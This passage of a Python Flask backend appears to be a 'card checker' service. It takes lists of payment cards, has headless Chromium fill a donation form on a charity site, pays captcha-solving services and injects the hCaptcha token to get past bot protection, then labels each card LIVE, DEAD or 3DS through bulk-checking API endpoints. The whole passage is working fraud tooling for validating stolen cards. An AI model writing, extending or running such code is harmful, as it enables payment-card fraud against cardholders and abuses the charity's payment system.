                                    logger.warning("⚠️ Captcha no soportado con enterprise, reintentando SIN enterprise...")
                                    # Aquí podrías reintentar sin enterprisePayload
                                
                                break
                                
                        except Exception as e:
                            logger.error(f"❌ Error en getTaskResult (intento {i+1}): {e}")
                            continue
                    
                    # ===== INYECTAR SOLUCIÓN =====
                    if solution:
                        logger.info(f"💉 Inyectando solución para ****{card_last4}")
                        
                        try:
                            # Inyectar con múltiples métodos
                            inject_result = page.evaluate("""
                                (solution) => {
                                    console.log('🎯 Inyectando solución hCaptcha...');
                                    const results = {
                                        field_found: false,
                                        field_created: false,
                                        value_set: false,
                                        events_dispatched: false
                                    };
                                    
                                    // MÉTODO 1: Buscar campo existente
                                    let field = document.querySelector('[name="h-captcha-response"]');
                                    if (!field) {
                                        field = document.getElementById('h-captcha-response');
                                    }
                                    
                                    // MÉTODO 2: Crear campo si no existe
                                    if (!field) {
                                        field = document.createElement('textarea');
                                        field.name = 'h-captcha-response';
                                        field.id = 'h-captcha-response';
                                        field.style.display = 'none';
                                        document.body.appendChild(field);
                                        results.field_created = true;
                                    } else {
                                        results.field_found = true;
                                    }
                                    
                                    // Asignar valor
                                    if (field) {
                                        field.value = solution;
                                        results.value_set = true;
                                        
                                        // Disparar eventos
                                        field.dispatchEvent(new Event('input', { bubbles: true }));
                                        field.dispatchEvent(new Event('change', { bubbles: true }));
                                        results.events_dispatched = true;
                                        
                                        console.log('✅ Solución inyectada correctamente');
                                    }
                                    
                                    // MÉTODO 3: Intentar callback de hCaptcha
                                    if (window.hcaptcha) {
                                        try {
                                            window.hcaptcha.execute();
                                            console.log('✅ hcaptcha.execute() llamado');
                                        } catch(e) {
                                            console.log('❌ Error en hcaptcha.execute():', e);
                                        }
                                    }
                                    
                                    return results;
                                }
                            """, solution)
                            
                            logger.info(f"💉 Resultado inyección: {inject_result}")
                            time.sleep(2)
                            
                            # ===== RE-ENVIAR FORMULARIO =====
                            logger.info("🔄 Re-enviando formulario...")
                            
                            submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
                            if submit_btn.count() > 0:
                                logger.info(f"✅ Botón submit encontrado, haciendo click...")
                                submit_btn.first.click()
                                time.sleep(5)
                                logger.info("✅ Formulario reenviado")
                                return True
                            else:
                                logger.error("❌ No se encontró botón de submit")
                                
                                # Intentar submit del form directamente
                                form_submit = page.evaluate("""
                                    () => {
                                        const form = document.querySelector('form');
                                        if (form) {
                                            form.submit();
                                            return true;
                                        }
                                        return false;
                                    }
                                """)
                                if form_submit:
                                    logger.info("✅ Formulario submitteado vía JavaScript")
                                    time.sleep(5)
                                    return True
                                else:
                                    logger.error("❌ No se pudo enviar el formulario")
                                    return False
                            
                        except Exception as e:
                            logger.error(f"❌ Error INYECTANDO solución: {e}")
                            logger.error(f"Stacktrace: {traceback.format_exc()}")
                            return False
                    else:
                        logger.error(f"❌ NO se obtuvo solución de AntiCaptcha después de 45 intentos")
                        return False
                        
                else:
                    error_desc = result.get("errorDescription", "Unknown error")
                    error_code = result.get("errorCode", "NO_CODE")
                    logger.error(f"❌ Error creando tarea AntiCaptcha: {error_code} - {error_desc}")
                    
                    # Debug específico para errores comunes
                    if "ERROR_KEY_DOES_NOT_EXIST" in error_desc:
                        logger.error("❌ API_KEY_ANTICAPTCHA es inválida")
                    elif "ZERO_BALANCE" in error_desc:
                        logger.error("❌ Saldo AntiCaptcha: $0.00")
                    elif "ERROR_WRONG_TASK_TYPE" in error_desc:
                        logger.error("❌ Tipo de tarea incorrecto para este captcha")
                    
                    return False
                    
            except Exception as e:
                logger.error(f"❌ Error CRÍTICO en proceso AntiCaptcha: {e}")
                logger.error(f"Stacktrace: {traceback.format_exc()}")
                return False
            
        except Exception as e:
            logger.error(f"❌ Error CRÍTICO en solve_captcha_if_present: {e}")
            logger.error(f"Stacktrace: {traceback.format_exc()}")
            return False    
    
    def enable_hcaptcha_accessibility(self, page):
        """Activar modo accesibilidad de hCaptcha"""
        try:
            logger.info("🔄 Activando modo accesibilidad hCaptcha...")
            
            # Establecer cookie de accesibilidad
            page.evaluate("""
                () => {
                    // Cookie de accesibilidad hCaptcha
                    document.cookie = "hc_accessibility=1; domain=.hcaptcha.com; path=/; secure";
                    document.cookie = "hc_accessibility=1; domain=hcaptcha.com; path=/; secure";
                    document.cookie = "hc_accessibility=1; domain=.edupam.org; path=/; secure";
                    
                    // También establecer en localStorage
                    try {
                        localStorage.setItem('hc_accessibility', '1');
                        sessionStorage.setItem('hc_accessibility', '1');
                    } catch(e) {}
                    
                    console.log('🎯 Cookie de accesibilidad establecida');
                    return true;
                }
            """)
            
            time.sleep(2)
            return True
            
        except Exception as e:
            logger.error(f"❌ Error activando accesibilidad: {e}")
            return False

    def check_single_card(self, card_string, amount=50):
        """Verificar una sola tarjeta"""
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🚀 INICIANDO VERIFICACIÓN para ****{card_last4}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Error parseando tarjeta',
                'card': f"****{card_last4}"
            }
        
        playwright = None
        browser = None
        page = None
        
        try:
            # Iniciar Playwright
            playwright = sync_playwright().start()
            
            browser = playwright.chromium.launch(
                executable_path='/usr/bin/chromium',
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            
            context = browser.new_context()
            page = context.new_page()
            
            # Navegar
            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
            time.sleep(3)
            
            logger.info(f"📄 URL actual: {page.url}")
            
            # Llenar formulario
            if not self.fill_form(page, amount):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error llenando formulario',
                    'card': f"****{card_last4}"
                }
            
            # Ingresar tarjeta
            if not self.fill_card_simple(page, card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error ingresando tarjeta',
                    'card': f"****{card_last4}"
                }
            
            time.sleep(2)
            
            # Enviar donación
            btn = page.locator('#btn-donation')
            if btn.count() == 0:
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Botón no encontrado',
                    'card': f"****{card_last4}"
                }
            
            btn.click()
            time.sleep(3)
            
            # Intentar resolver captcha si aparece
            captcha_solved = True
            if any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
                logger.info(f"🔍 Verificando captcha para ****{card_last4}...")
                captcha_solved = self.solve_captcha_if_present(page, card_last4)
                if not captcha_solved:
                    logger.warning(f"⚠️ No se pudo resolver captcha para ****{card_last4}")
                    # Continuar de todos modos, el resultado dirá si funcionó o no
            
            # Esperar respuesta
            wait_time = 10 if captcha_solved else 6
            logger.info(f"⏳ Esperando respuesta ({wait_time} segundos)...")
            time.sleep(wait_time)
            
            logger.info(f"📄 URL después de enviar: {page.url}")
            
            # Tomar screenshot
            screenshot_b64 = None
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                time.sleep(0.5)
                screenshot_bytes = page.screenshot(full_page=True)
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                logger.info(f"📸 Screenshot tomado para ****{card_last4}")
            except Exception as e:
                logger.error(f"Error screenshot: {e}")
            
            # Analizar resultado
            current_url = page.url
            analysis = self.analyzer.analyze_payment_result(page, current_url, card_last4)
            
            # Mapear estado
            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
            final_status = status_map.get(analysis['status'], 'ERROR')
            
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
            }
            
            # Construir resultado
            result = {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(analysis['evidence']),
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'screenshot': screenshot_b64,
                    'timestamp': datetime.now().isoformat(),
                    'captcha_solved': captcha_solved
                },
                'card': f"****{card_last4}",
                'gate': 'Edupam',
                'amount': amount
            }
            
            logger.info(f"✅ VERIFICACIÓN COMPLETADA para ****{card_last4}: {final_status}")
            
            # Limpiar recursos
            try:
                page.close()
                context.close()
                browser.close()
                playwright.stop()
            except:
                pass
            
            return result
            
        except Exception as e:
            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
            # Limpiar recursos en caso de error
            try:
                if page and not page.is_closed():
                    page.close()
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
            except:
                pass
            
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)[:100]}',
                'card': f"****{card_last4}"
            }

# ========== FUNCIONES DEL WORKER ==========

def process_cards_worker(cards, amount, stop_on_live):
    """Worker que procesa las tarjetas"""
    global checking_status
    
    checker = EdupamChecker(headless=HEADLESS)
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_single_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False

# ========== ENDPOINTS API (MANTENIDOS IGUAL) ==========

@app.route('/')
def index():
    """Endpoint raíz del backend"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.2",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled",
            "anticaptcha": "enabled" if API_KEY_ANTICAPTCHA else "disabled",
            "capsolver": "enabled" if API_KEY_CAPSOLVER else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.2',
        'timestamp': datetime.now().isoformat(),
        'features': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER),
            'screenshots': True,
            'multi_card_check': True
        }
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual del checker"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results']),
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta (para el frontend)"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    
    # Extraer datos
    card_data = data.get('card', '')
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Parsear tarjeta
    parts = card_data.split('|')
    if len(parts) < 4:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta incompleto',
            'original_status': '⚠️ Error'
        }), 400
    
    card_number = parts[0].strip()
    
    # Validar formato básico
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Número de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar tarjeta
    checker = EdupamChecker(headless=HEADLESS)
    result = checker.check_single_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread de verificación
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount,
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados del chequeo"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        },
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo en curso"""
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ========== INICIALIZACIÓN ==========

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    
    # Mostrar estado de servicios de captcha
    if API_KEY_2CAPTCHA:
        logger.info(f"   2Captcha: ✅ ENABLED")
    if API_KEY_ANTICAPTCHA:
        logger.info(f"   AntiCaptcha: ✅ ENABLED")
    if API_KEY_CAPSOLVER:
        logger.info(f"   CapSolver: ✅ ENABLED")
    
    if not any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
        logger.warning(f"   Captcha Services: ⚠️ NONE configurado - Los captchas no se resolverán")
    
    app.run(host='0.0.0.0', port=port, debug=debug)